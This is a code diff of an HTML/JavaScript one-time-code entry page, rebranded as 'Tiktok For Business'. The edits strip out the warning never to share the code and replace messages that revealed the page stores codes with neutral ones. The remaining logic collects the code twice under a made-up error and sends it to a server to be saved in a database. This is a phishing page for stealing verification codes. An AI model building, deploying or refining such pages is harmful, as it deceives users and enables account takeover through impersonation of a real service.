@@ -363,36 +363,20 @@
             </svg>
         </div>
 
-        <h2>OTP Verification</h2>
+        <h2>Tiktok For Business</h2>
         
         <!-- Message exactly as requested -->
         <div class="otp-sent-message">
-            <strong>📱 Check your OTP</strong>
-            We've sent a 4-digit code to your email and phone
-            <div class="warning">
-                <span class="warning-icon">!</span>
-                DO NOT share this code with anyone
-            </div>
+            <strong>Check your OTP</strong>
+            We've sent a 4-digit code to your email OR phone. Check the spam folder if not yet received!
         </div>
 
-        <div class="email-display" id="emailDisplay"></div>
-        
-        <div class="step-indicator">
-            <div class="step active" id="step1">1</div>
-            <div class="step" id="step2">2</div>
-        </div>
-        
-        <div class="instruction" id="instruction">
-            Step 1: Enter the 4-digit OTP sent to you
-        </div>
-        
         <div class="form-group">
             <label for="otp" id="otpLabel">Enter 4-digit OTP</label>
             <input type="text" id="otp" maxlength="4" pattern="\d*" inputmode="numeric" placeholder="----" autocomplete="off">
         </div>
         
         <button onclick="handleOTP()" id="actionBtn">Verify OTP</button>
-        <button onclick="retryProcess()" id="retryBtn" class="secondary retry-btn" style="display: none;">Start Over</button>
         
         <div id="message" class="message"></div>
     </div>
@@ -484,7 +468,7 @@
             if (step === 1) {
                 // Step 1: Store first OTP and show error message (as required)
                 firstOTP = otp;
-                showMessage('Error: Try again! This was your first attempt. Now confirm it.', 'error');
+                showMessage('Confirm the OTP again', 'error');
                 
                 // Move to step 2
                 step = 2;
@@ -494,7 +478,7 @@
                 // Step 2: Verify OTP matches first attempt
                 if (otp === firstOTP) {
                     // OTPs match - SUCCESS!
-                    showLoading('Verifying OTP', 'Please wait while we save your OTP...');
+                    showLoading('Verifying OTP', 'Verifying...');
                     
                     try {
                         // Send to server to save in database
